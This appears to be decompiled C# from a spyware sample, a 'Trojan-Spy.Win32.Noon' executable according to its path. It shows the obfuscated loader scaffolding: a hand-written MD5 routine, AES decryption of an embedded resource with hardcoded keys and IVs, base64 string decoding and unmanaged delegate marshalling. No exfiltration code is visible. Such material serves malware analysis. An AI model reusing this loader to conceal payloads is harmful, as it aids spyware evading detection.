// Decompiled with JetBrains decompiler
// Type:  
// Assembly: ProgIdRedirectionEn, Version=1.7.3.0, Culture=neutral, PublicKeyToken=null
// MVID: B81F1514-ABAD-442F-0D6D-30821B04B8DB
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\Trojan-Spy.Win32.Noon.bcqy-84d399a3116d4038d5730fdbae6857142c0141f042dbba9a42e8a21e1ce6448b.exe

using System;
using System.Collections;
using System.IO;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;

internal sealed class \u000E\u2001
{
  private static bool \u0002 = false;
  private static Assembly \u0003 = typeof (\u000E\u2001).Assembly;
  private static uint[] \u0005 = new uint[64]
  {
    3614090360U,
    3905402710U,
    606105819U,
    3250441966U,
    4118548399U,
    1200080426U,
    2821735955U,
    4249261313U,
    1770035416U,
    2336552879U,
    4294925233U,
    2304563134U,
    1804603682U,
    4254626195U,
    2792965006U,
    1236535329U,
    4129170786U,
    3225465664U,
    643717713U,
    3921069994U,
    3593408605U,
    38016083U,
    3634488961U,
    3889429448U,
    568446438U,
    3275163606U,
    4107603335U,
    1163531501U,
    2850285829U,
    4243563512U,
    1735328473U,
    2368359562U,
    4294588738U,
    2272392833U,
    1839030562U,
    4259657740U,
    2763975236U,
    1272893353U,
    4139469664U,
    3200236656U,
    681279174U,
    3936430074U,
    3572445317U,
    76029189U,
    3654602809U,
    3873151461U,
    530742520U,
    3299628645U,
    4096336452U,
    1126891415U,
    2878612391U,
    4237533241U,
    1700485571U,
    2399980690U,
    4293915773U,
    2240044497U,
    1873313359U,
    4264355552U,
    2734768916U,
    1309151649U,
    4149444226U,
    3174756917U,
    718787259U,
    3951481745U
  };
  private static bool \u0008 = false;
  private static bool \u0006 = false;
  private static byte[] \u000E = new byte[0];
  private static byte[] \u000F = new byte[0];
  private static byte[] \u0002\u2000 = new byte[0];
  private static byte[] \u0003\u2000 = new byte[0];
  private static IntPtr \u0005\u2000 = IntPtr.Zero;
  private static IntPtr \u0008\u2000 = IntPtr.Zero;
  private static object \u0006\u2000 = (object) new string[0];
  private static int[] \u000E\u2000 = new int[0];
  private static int \u000F\u2000 = 1;
  private static bool \u0002\u2001 = false;
  private static SortedList \u0003\u2001 = new SortedList();
  private static int \u0005\u2001 = 0;
  private static long \u0008\u2001 = 0;
  internal static \u000E\u2001.\u000E \u0006\u2001 = (\u000E\u2001.\u000E) null;
  internal static \u000E\u2001.\u000E \u000E\u2001 = (\u000E\u2001.\u000E) null;
  private static long \u000F\u2001 = 0;
  private static int \u0002\u2002 = 0;
  private static bool \u0003\u2002 = false;
  private static bool \u0005\u2002 = false;
  private static int \u0008\u2002 = 0;
  private static IntPtr \u0006\u2002 = IntPtr.Zero;
  [\u000E\u2001.\u0003(typeof (\u000E\u2001.\u0003.\u0030\u002C\u0020Culture\u003Dneutral\u002C\u0020PublicKeyToken\u003Db77a5c561934e089\u005D\u005D\u005B\u005D))]
  private static bool \u000E\u2002 = false;
  internal static Hashtable \u000F\u2002 = new Hashtable();

  [MethodImpl(MethodImplOptions.NoInlining)]
  static \u000E\u2001()
  {
    try
    {
      RSACryptoServiceProvider.UseMachineKeyStore = true;
    }
    catch
    {
    }
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  public \u000E\u2001()
  {
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  private void \u0002()
  {
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static byte[] \u0002(byte[] _param0)
  {
    uint[] numArray1 = new uint[16];
    uint num1 = (uint) ((448 - _param0.Length * 8 % 512 + 512) % 512);
    if (num1 == 0U)
      num1 = 512U;
    uint length = (uint) ((ulong) _param0.Length + (ulong) (num1 / 8U) + 8UL);
    ulong num2 = (ulong) _param0.Length * 8UL;
    byte[] numArray2 = new byte[(IntPtr) length];
    for (int index = 0; index < _param0.Length; ++index)
      numArray2[index] = _param0[index];
    numArray2[_param0.Length] |= (byte) 128;
    for (int index = 8; index > 0; --index)
      numArray2[(long) length - (long) index] = (byte) (num2 >> (8 - index) * 8);
    uint num3 = (uint) (numArray2.Length * 8) / 32U;
    uint num4 = 1732584193;
    uint num5 = 4023233417;
    uint num6 = 2562383102;
    uint num7 = 271733878;
    for (uint index1 = 0; index1 < num3 / 16U; ++index1)
    {
      uint num8 = index1 << 6;
      for (uint index2 = 0; index2 < 61U; index2 += 4U)
        numArray1[(IntPtr) (index2 >> 2)] = (uint) ((int) numArray2[(IntPtr) (num8 + (index2 + 3U))] << 24 | (int) numArray2[(IntPtr) (num8 + (index2 + 2U))] << 16 | (int) numArray2[(IntPtr) (num8 + (index2 + 1U))] << 8) | (uint) numArray2[(IntPtr) (num8 + index2)];
      uint num9 = num4;
      uint num10 = num5;
      uint num11 = num6;
      uint num12 = num7;
      \u000E\u2001.\u0002(ref num4, num5, num6, num7, 0U, (ushort) 7, 1U, numArray1);
      \u000E\u2001.\u0002(ref num7, num4, num5, num6, 1U, (ushort) 12, 2U, numArray1);
      \u000E\u2001.\u0002(ref num6, num7, num4, num5, 2U, (ushort) 17, 3U, numArray1);
      \u000E\u2001.\u0002(ref num5, num6, num7, num4, 3U, (ushort) 22, 4U, numArray1);
      \u000E\u2001.\u0002(ref num4, num5, num6, num7, 4U, (ushort) 7, 5U, numArray1);
      \u000E\u2001.\u0002(ref num7, num4, num5, num6, 5U, (ushort) 12, 6U, numArray1);
      \u000E\u2001.\u0002(ref num6, num7, num4, num5, 6U, (ushort) 17, 7U, numArray1);
      \u000E\u2001.\u0002(ref num5, num6, num7, num4, 7U, (ushort) 22, 8U, numArray1);
      \u000E\u2001.\u0002(ref num4, num5, num6, num7, 8U, (ushort) 7, 9U, numArray1);
      \u000E\u2001.\u0002(ref num7, num4, num5, num6, 9U, (ushort) 12, 10U, numArray1);
      \u000E\u2001.\u0002(ref num6, num7, num4, num5, 10U, (ushort) 17, 11U, numArray1);
      \u000E\u2001.\u0002(ref num5, num6, num7, num4, 11U, (ushort) 22, 12U, numArray1);
      \u000E\u2001.\u0002(ref num4, num5, num6, num7, 12U, (ushort) 7, 13U, numArray1);
      \u000E\u2001.\u0002(ref num7, num4, num5, num6, 13U, (ushort) 12, 14U, numArray1);
      \u000E\u2001.\u0002(ref num6, num7, num4, num5, 14U, (ushort) 17, 15U, numArray1);
      \u000E\u2001.\u0002(ref num5, num6, num7, num4, 15U, (ushort) 22, 16U, numArray1);
      \u000E\u2001.\u0003(ref num4, num5, num6, num7, 1U, (ushort) 5, 17U, numArray1);
      \u000E\u2001.\u0003(ref num7, num4, num5, num6, 6U, (ushort) 9, 18U, numArray1);
      \u000E\u2001.\u0003(ref num6, num7, num4, num5, 11U, (ushort) 14, 19U, numArray1);
      \u000E\u2001.\u0003(ref num5, num6, num7, num4, 0U, (ushort) 20, 20U, numArray1);
      \u000E\u2001.\u0003(ref num4, num5, num6, num7, 5U, (ushort) 5, 21U, numArray1);
      \u000E\u2001.\u0003(ref num7, num4, num5, num6, 10U, (ushort) 9, 22U, numArray1);
      \u000E\u2001.\u0003(ref num6, num7, num4, num5, 15U, (ushort) 14, 23U, numArray1);
      \u000E\u2001.\u0003(ref num5, num6, num7, num4, 4U, (ushort) 20, 24U, numArray1);
      \u000E\u2001.\u0003(ref num4, num5, num6, num7, 9U, (ushort) 5, 25U, numArray1);
      \u000E\u2001.\u0003(ref num7, num4, num5, num6, 14U, (ushort) 9, 26U, numArray1);
      \u000E\u2001.\u0003(ref num6, num7, num4, num5, 3U, (ushort) 14, 27U, numArray1);
      \u000E\u2001.\u0003(ref num5, num6, num7, num4, 8U, (ushort) 20, 28U, numArray1);
      \u000E\u2001.\u0003(ref num4, num5, num6, num7, 13U, (ushort) 5, 29U, numArray1);
      \u000E\u2001.\u0003(ref num7, num4, num5, num6, 2U, (ushort) 9, 30U, numArray1);
      \u000E\u2001.\u0003(ref num6, num7, num4, num5, 7U, (ushort) 14, 31U, numArray1);
      \u000E\u2001.\u0003(ref num5, num6, num7, num4, 12U, (ushort) 20, 32U, numArray1);
      \u000E\u2001.\u0005(ref num4, num5, num6, num7, 5U, (ushort) 4, 33U, numArray1);
      \u000E\u2001.\u0005(ref num7, num4, num5, num6, 8U, (ushort) 11, 34U, numArray1);
      \u000E\u2001.\u0005(ref num6, num7, num4, num5, 11U, (ushort) 16, 35U, numArray1);
      \u000E\u2001.\u0005(ref num5, num6, num7, num4, 14U, (ushort) 23, 36U, numArray1);
      \u000E\u2001.\u0005(ref num4, num5, num6, num7, 1U, (ushort) 4, 37U, numArray1);
      \u000E\u2001.\u0005(ref num7, num4, num5, num6, 4U, (ushort) 11, 38U, numArray1);
      \u000E\u2001.\u0005(ref num6, num7, num4, num5, 7U, (ushort) 16, 39U, numArray1);
      \u000E\u2001.\u0005(ref num5, num6, num7, num4, 10U, (ushort) 23, 40U, numArray1);
      \u000E\u2001.\u0005(ref num4, num5, num6, num7, 13U, (ushort) 4, 41U, numArray1);
      \u000E\u2001.\u0005(ref num7, num4, num5, num6, 0U, (ushort) 11, 42U, numArray1);
      \u000E\u2001.\u0005(ref num6, num7, num4, num5, 3U, (ushort) 16, 43U, numArray1);
      \u000E\u2001.\u0005(ref num5, num6, num7, num4, 6U, (ushort) 23, 44U, numArray1);
      \u000E\u2001.\u0005(ref num4, num5, num6, num7, 9U, (ushort) 4, 45U, numArray1);
      \u000E\u2001.\u0005(ref num7, num4, num5, num6, 12U, (ushort) 11, 46U, numArray1);
      \u000E\u2001.\u0005(ref num6, num7, num4, num5, 15U, (ushort) 16, 47U, numArray1);
      \u000E\u2001.\u0005(ref num5, num6, num7, num4, 2U, (ushort) 23, 48U, numArray1);
      \u000E\u2001.\u0008(ref num4, num5, num6, num7, 0U, (ushort) 6, 49U, numArray1);
      \u000E\u2001.\u0008(ref num7, num4, num5, num6, 7U, (ushort) 10, 50U, numArray1);
      \u000E\u2001.\u0008(ref num6, num7, num4, num5, 14U, (ushort) 15, 51U, numArray1);
      \u000E\u2001.\u0008(ref num5, num6, num7, num4, 5U, (ushort) 21, 52U, numArray1);
      \u000E\u2001.\u0008(ref num4, num5, num6, num7, 12U, (ushort) 6, 53U, numArray1);
      \u000E\u2001.\u0008(ref num7, num4, num5, num6, 3U, (ushort) 10, 54U, numArray1);
      \u000E\u2001.\u0008(ref num6, num7, num4, num5, 10U, (ushort) 15, 55U, numArray1);
      \u000E\u2001.\u0008(ref num5, num6, num7, num4, 1U, (ushort) 21, 56U, numArray1);
      \u000E\u2001.\u0008(ref num4, num5, num6, num7, 8U, (ushort) 6, 57U, numArray1);
      \u000E\u2001.\u0008(ref num7, num4, num5, num6, 15U, (ushort) 10, 58U, numArray1);
      \u000E\u2001.\u0008(ref num6, num7, num4, num5, 6U, (ushort) 15, 59U, numArray1);
      \u000E\u2001.\u0008(ref num5, num6, num7, num4, 13U, (ushort) 21, 60U, numArray1);
      \u000E\u2001.\u0008(ref num4, num5, num6, num7, 4U, (ushort) 6, 61U, numArray1);
      \u000E\u2001.\u0008(ref num7, num4, num5, num6, 11U, (ushort) 10, 62U, numArray1);
      \u000E\u2001.\u0008(ref num6, num7, num4, num5, 2U, (ushort) 15, 63U, numArray1);
      \u000E\u2001.\u0008(ref num5, num6, num7, num4, 9U, (ushort) 21, 64U, numArray1);
      num4 += num9;
      num5 += num10;
      num6 += num11;
      num7 += num12;
    }
    byte[] destinationArray = new byte[16];
    Array.Copy((Array) BitConverter.GetBytes(num4), 0, (Array) destinationArray, 0, 4);
    Array.Copy((Array) BitConverter.GetBytes(num5), 0, (Array) destinationArray, 4, 4);
    Array.Copy((Array) BitConverter.GetBytes(num6), 0, (Array) destinationArray, 8, 4);
    Array.Copy((Array) BitConverter.GetBytes(num7), 0, (Array) destinationArray, 12, 4);
    return destinationArray;
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  private static void \u0002(
    ref uint _param0,
    uint _param1,
    uint _param2,
    uint _param3,
    uint _param4,
    ushort _param5,
    uint _param6,
    uint[] _param7)
  {
    _param0 = _param1 + \u000E\u2001.\u0002(_param0 + (uint) ((int) _param1 & (int) _param2 | ~(int) _param1 & (int) _param3) + _param7[(IntPtr) _param4] + \u000E\u2001.\u0005[(IntPtr) (_param6 - 1U)], _param5);
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  private static void \u0003(
    ref uint _param0,
    uint _param1,
    uint _param2,
    uint _param3,
    uint _param4,
    ushort _param5,
    uint _param6,
    uint[] _param7)
  {
    _param0 = _param1 + \u000E\u2001.\u0002(_param0 + (uint) ((int) _param1 & (int) _param3 | (int) _param2 & ~(int) _param3) + _param7[(IntPtr) _param4] + \u000E\u2001.\u0005[(IntPtr) (_param6 - 1U)], _param5);
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  private static void \u0005(
    ref uint _param0,
    uint _param1,
    uint _param2,
    uint _param3,
    uint _param4,
    ushort _param5,
    uint _param6,
    uint[] _param7)
  {
    _param0 = _param1 + \u000E\u2001.\u0002(_param0 + (_param1 ^ _param2 ^ _param3) + _param7[(IntPtr) _param4] + \u000E\u2001.\u0005[(IntPtr) (_param6 - 1U)], _param5);
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  private static void \u0008(
    ref uint _param0,
    uint _param1,
    uint _param2,
    uint _param3,
    uint _param4,
    ushort _param5,
    uint _param6,
    uint[] _param7)
  {
    _param0 = _param1 + \u000E\u2001.\u0002(_param0 + (_param2 ^ (_param1 | ~_param3)) + _param7[(IntPtr) _param4] + \u000E\u2001.\u0005[(IntPtr) (_param6 - 1U)], _param5);
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  private static uint \u0002(uint _param0, ushort _param1) => _param0 >> 32 - (int) _param1 | _param0 << (int) _param1;

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static bool \u0002()
  {
    if (!\u000E\u2001.\u0008)
    {
      \u000E\u2001.\u0002();
      \u000E\u2001.\u0008 = true;
    }
    return \u000E\u2001.\u0006;
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static SymmetricAlgorithm \u0002()
  {
    if (\u000E\u2001.\u0002())
      return (SymmetricAlgorithm) new AesCryptoServiceProvider();
    try
    {
      return (SymmetricAlgorithm) new RijndaelManaged();
    }
    catch
    {
      return (SymmetricAlgorithm) Activator.CreateInstance(\u0005\u2007.\u0002(-1359009734), \u0005\u2007.\u0002(-1359007785)).Unwrap();
    }
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static void \u0002()
  {
    try
    {
      \u000E\u2001.\u0006 = CryptoConfig.AllowOnlyFipsAlgorithms;
    }
    catch
    {
    }
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static byte[] \u0003(byte[] _param0) => !\u000E\u2001.\u0002() ? new MD5CryptoServiceProvider().ComputeHash(_param0) : \u000E\u2001.\u0002(_param0);

  [\u000E\u2001.\u0003(typeof (\u000E\u2001.\u0003.\u0030\u002C\u0020Culture\u003Dneutral\u002C\u0020PublicKeyToken\u003Db77a5c561934e089\u005D\u005D\u005B\u005D))]
  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static bool \u0002(int _param0)
  {
    if (\u000E\u2001.\u000F.Length == 0)
    {
      BinaryReader binaryReader = new BinaryReader(\u000E\u2001.\u0003.GetManifestResourceStream(\u0005\u2007.\u0002(-1359007861)));
      binaryReader.BaseStream.Position = 0L;
      RSACryptoServiceProvider.UseMachineKeyStore = true;
      byte[] buffer = binaryReader.ReadBytes((int) binaryReader.BaseStream.Length);
      byte[] rgbKey = new \u000E\u2001().\u0008();
      byte[] rgbIV = new \u000E\u2001().\u0005();
      byte[] publicKeyToken = \u000E\u2001.\u0003.GetName().GetPublicKeyToken();
      if (publicKeyToken != null && publicKeyToken.Length > 0)
      {
        rgbIV[1] = publicKeyToken[0];
        rgbIV[3] = publicKeyToken[1];
        rgbIV[5] = publicKeyToken[2];
        rgbIV[7] = publicKeyToken[3];
        rgbIV[9] = publicKeyToken[4];
        rgbIV[11] = publicKeyToken[5];
        rgbIV[13] = publicKeyToken[6];
        rgbIV[15] = publicKeyToken[7];
      }
      SymmetricAlgorithm symmetricAlgorithm = \u000E\u2001.\u0002();
      symmetricAlgorithm.Mode = CipherMode.CBC;
      ICryptoTransform decryptor = symmetricAlgorithm.CreateDecryptor(rgbKey, rgbIV);
      MemoryStream memoryStream = new MemoryStream();
      CryptoStream cryptoStream = new CryptoStream((Stream) memoryStream, decryptor, CryptoStreamMode.Write);
      cryptoStream.Write(buffer, 0, buffer.Length);
      cryptoStream.FlushFinalBlock();
      \u000E\u2001.\u000F = memoryStream.ToArray();
      memoryStream.Close();
      cryptoStream.Close();
      binaryReader.Close();
    }
    if (\u000E\u2001.\u000E.Length == 0)
      \u000E\u2001.\u000E = \u000E\u2001.\u0002(\u000E\u2001.\u0002((object) \u000E\u2001.\u0003).ToString());
    int index = 0;
    try
    {
      index = BitConverter.ToInt32(new byte[4]
      {
        \u000E\u2001.\u000F[_param0],
        \u000E\u2001.\u000F[_param0 + 1],
        \u000E\u2001.\u000F[_param0 + 2],
        \u000E\u2001.\u000F[_param0 + 3]
      }, 0);
    }
    catch
    {
    }
    try
    {
      if (\u000E\u2001.\u000E[index] == (byte) 128)
        return true;
    }
    catch
    {
    }
    return false;
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  private static uint \u0002(uint _param0) => 25;

  [MethodImpl(MethodImplOptions.NoInlining)]
  private static uint \u0003(uint _param0) => 25;

  [\u000E\u2001.\u0003(typeof (\u000E\u2001.\u0003.\u0030\u002C\u0020Culture\u003Dneutral\u002C\u0020PublicKeyToken\u003Db77a5c561934e089\u005D\u005D\u005B\u005D))]
  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static string \u0002(string _param0)
  {
    byte[] bytes = Convert.FromBase64String(_param0);
    return Encoding.Unicode.GetString(bytes, 0, bytes.Length);
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  private static int \u0002() => 5;

  [MethodImpl(MethodImplOptions.NoInlining)]
  private static void \u0003()
  {
    try
    {
      RSACryptoServiceProvider.UseMachineKeyStore = true;
    }
    catch
    {
    }
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  private static Delegate \u0002(IntPtr _param0, Type _param1) => (Delegate) typeof (Marshal).GetMethod(\u0005\u2007.\u0002(-1359007893), new Type[2]
  {
    typeof (IntPtr),
    typeof (Type)
  }).Invoke((object) null, new object[2]
  {
    (object) _param0,
    (object) _param1
  });

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static object \u0002(object _param0)
  {
    try
    {
      if (File.Exists(((Assembly) _param0).Location))
        return (object) ((Assembly) _param0).Location;
    }
    catch
    {
    }
    try
    {
      if (File.Exists(((Assembly) _param0).GetName().CodeBase.ToString().Replace(\u0005\u2007.\u0002(-1359007913), string.Empty)))
        return (object) ((Assembly) _param0).GetName().CodeBase.ToString().Replace(\u0005\u2007.\u0002(-1359007913), string.Empty);
    }
    catch
    {
    }
    try
    {
      if (File.Exists(_param0.GetType().GetProperty(\u0005\u2007.\u0002(-1359007962)).GetValue(_param0, new object[0]).ToString()))
        return (object) _param0.GetType().GetProperty(\u0005\u2007.\u0002(-1359007962)).GetValue(_param0, new object[0]).ToString();
    }
    catch
    {
    }
    return (object) string.Empty;
  }

  [\u000E\u2001.\u0003(typeof (\u000E\u2001.\u0003.\u0030\u002C\u0020Culture\u003Dneutral\u002C\u0020PublicKeyToken\u003Db77a5c561934e089\u005D\u005D\u005B\u005D))]
  [MethodImpl(MethodImplOptions.NoInlining)]
  private static byte[] \u0002(string _param0)
  {
    byte[] buffer;
    using (FileStream fileStream = new FileStream(_param0, FileMode.Open, FileAccess.Read, FileShare.Read))
    {
      int offset = 0;
      int length = (int) fileStream.Length;
      buffer = new byte[length];
      int num;
      for (; length > 0; length -= num)
      {
        num = fileStream.Read(buffer, offset, length);
        offset += num;
      }
    }
    return buffer;
  }

  [\u000E\u2001.\u0003(typeof (\u000E\u2001.\u0003.\u0030\u002C\u0020Culture\u003Dneutral\u002C\u0020PublicKeyToken\u003Db77a5c561934e089\u005D\u005D\u005B\u005D))]
  [MethodImpl(MethodImplOptions.NoInlining)]
  private static byte[] \u0005(byte[] _param0)
  {
    MemoryStream memoryStream = new MemoryStream();
    SymmetricAlgorithm symmetricAlgorithm = \u000E\u2001.\u0002();
    symmetricAlgorithm.Key = new byte[32]
    {
      (byte) 123,
      (byte) 5,
      (byte) 74,
      (byte) 12,
      (byte) 244,
      (byte) 156,
      (byte) 221,
      (byte) 154,
      (byte) 121,
      (byte) 221,
      (byte) 183,
      (byte) 41,
      (byte) 121,
      (byte) 65,
      (byte) 9,
      (byte) 43,
      (byte) 67,
      (byte) 81,
      (byte) 23,
      (byte) 43,
      (byte) 74,
      (byte) 63,
      (byte) 64,
      (byte) 23,
      (byte) 95,
      (byte) 185,
      (byte) 226,
      (byte) 244,
      (byte) 45,
      (byte) 194,
      (byte) 211,
      (byte) 43
    };
    symmetricAlgorithm.IV = new byte[16]
    {
      (byte) 117,
      (byte) 254,
      (byte) 41,
      (byte) 121,
      (byte) 65,
      (byte) 52,
      (byte) 9,
      (byte) 43,
      (byte) 221,
      (byte) 154,
      (byte) 12,
      (byte) 54,
      (byte) 68,
      (byte) 241,
      (byte) 68,
      (byte) 66
    };
    CryptoStream cryptoStream = new CryptoStream((Stream) memoryStream, symmetricAlgorithm.CreateDecryptor(), CryptoStreamMode.Write);
    cryptoStream.Write(_param0, 0, _param0.Length);
    cryptoStream.Close();
    return memoryStream.ToArray();
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  private byte[] \u0002() => 25 > 0 ? new byte[2]
  {
    (byte) 1,
    (byte) 2
  } : new byte[2]{ (byte) 1, (byte) 2 };

  [MethodImpl(MethodImplOptions.NoInlining)]
  private byte[] \u0003() => 25 > 0 ? new byte[2]
  {
    (byte) 1,
    (byte) 2
  } : new byte[2]{ (byte) 1, (byte) 2 };

  [MethodImpl(MethodImplOptions.NoInlining)]
  private byte[] \u0005() => 25 > 0 ? new byte[2]
  {
    (byte) 1,
    (byte) 2
  } : new byte[2]{ (byte) 1, (byte) 2 };

  [MethodImpl(MethodImplOptions.NoInlining)]
  private byte[] \u0008() => 25 > 0 ? new byte[2]
  {
    (byte) 1,
    (byte) 2
  } : new byte[2]{ (byte) 1, (byte) 2 };

  [MethodImpl(MethodImplOptions.NoInlining)]
  private byte[] \u0006() => 25 > 0 ? new byte[2]
  {
    (byte) 1,
    (byte) 2
  } : new byte[2]{ (byte) 1, (byte) 2 };

  [MethodImpl(MethodImplOptions.NoInlining)]
  private byte[] \u000E() => 25 > 0 ? new byte[2]
  {
    (byte) 1,
    (byte) 2
  } : new byte[2]{ (byte) 1, (byte) 2 };

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal byte[] \u000F() => 25 > 0 ? new byte[2]
  {
    (byte) 1,
    (byte) 2
  } : new byte[2]{ (byte) 1, (byte) 2 };

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal byte[] \u0002\u2000() => 25 > 0 ? new byte[2]
  {
    (byte) 1,
    (byte) 2
  } : new byte[2]{ (byte) 1, (byte) 2 };

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal byte[] \u0003\u2000() => 25 > 0 ? new byte[2]
  {
    (byte) 1,
    (byte) 2
  } : new byte[2]{ (byte) 1, (byte) 2 };

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal byte[] \u0005\u2000() => 25 > 0 ? new byte[2]
  {
    (byte) 1,
    (byte) 2
  } : new byte[2]{ (byte) 1, (byte) 2 };

  [UnmanagedFunctionPointer(CallingConvention.StdCall)]
  private delegate IntPtr \u0002();

  internal sealed class \u0003 : Attribute
  {
    [\u000E\u2001.\u0003(typeof (\u000E\u2001.\u0003.\u0030\u002C\u0020Culture\u003Dneutral\u002C\u0020PublicKeyToken\u003Db77a5c561934e089\u005D\u005D\u005B\u005D))]
    [MethodImpl(MethodImplOptions.NoInlining)]
    public \u0003(object _param1)
    {
      \u0003\u2004.\u0002();
      // ISSUE: explicit constructor call
      base.\u002Ector();
    }

    internal sealed class \u0002<\u0002>
    {
      [MethodImpl(MethodImplOptions.NoInlining)]
      public \u0002()
      {
        \u0003\u2004.\u0002();
        // ISSUE: explicit constructor call
        base.\u002Ector();
      }

      internal static bool \u0002() => true;

      internal static bool \u0003() => false;
    }
  }

  internal struct \u0005
  {
    internal bool \u0002;
    internal byte[] \u0003;
  }

  private enum \u0006
  {
  }

  internal sealed class \u0008
  {
    [MethodImpl(MethodImplOptions.NoInlining)]
    public \u0008()
    {
      \u0003\u2004.\u0002();
      // ISSUE: explicit constructor call
      base.\u002Ector();
    }

    [\u000E\u2001.\u0003(typeof (\u000E\u2001.\u0003.\u0030\u002C\u0020Culture\u003Dneutral\u002C\u0020PublicKeyToken\u003Db77a5c561934e089\u005D\u005D\u005B\u005D))]
    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static string \u0002(string _param0, string _param1)
    {
      byte[] bytes = Encoding.Unicode.GetBytes(_param0);
      byte[] numArray1 = new byte[32]
      {
        (byte) 82,
        (byte) 102,
        (byte) 104,
        (byte) 110,
        (byte) 32,
        (byte) 77,
        (byte) 24,
        (byte) 34,
        (byte) 118,
        (byte) 181,
        (byte) 51,
        (byte) 17,
        (byte) 18,
        (byte) 51,
        (byte) 12,
        (byte) 109,
        (byte) 10,
        (byte) 32,
        (byte) 77,
        (byte) 24,
        (byte) 34,
        (byte) 158,
        (byte) 161,
        (byte) 41,
        (byte) 97,
        (byte) 28,
        (byte) 118,
        (byte) 181,
        (byte) 5,
        (byte) 25,
        (byte) 1,
        (byte) 88
      };
      byte[] numArray2 = \u000E\u2001.\u0003(Encoding.Unicode.GetBytes(_param1));
      MemoryStream memoryStream = new MemoryStream();
      SymmetricAlgorithm symmetricAlgorithm = \u000E\u2001.\u0002();
      symmetricAlgorithm.Key = numArray1;
      symmetricAlgorithm.IV = numArray2;
      CryptoStream cryptoStream = new CryptoStream((Stream) memoryStream, symmetricAlgorithm.CreateEncryptor(), CryptoStreamMode.Write);
      cryptoStream.Write(bytes, 0, bytes.Length);
      cryptoStream.Close();
      return Convert.ToBase64String(memoryStream.ToArray());
    }
  }

  [UnmanagedFunctionPointer(CallingConvention.StdCall)]
  internal delegate uint \u000E(
    IntPtr _param1,
    IntPtr _param2,
    IntPtr _param3,
    [MarshalAs(UnmanagedType.U4)] uint _param4,
    IntPtr _param5,
    ref uint _param6);
}
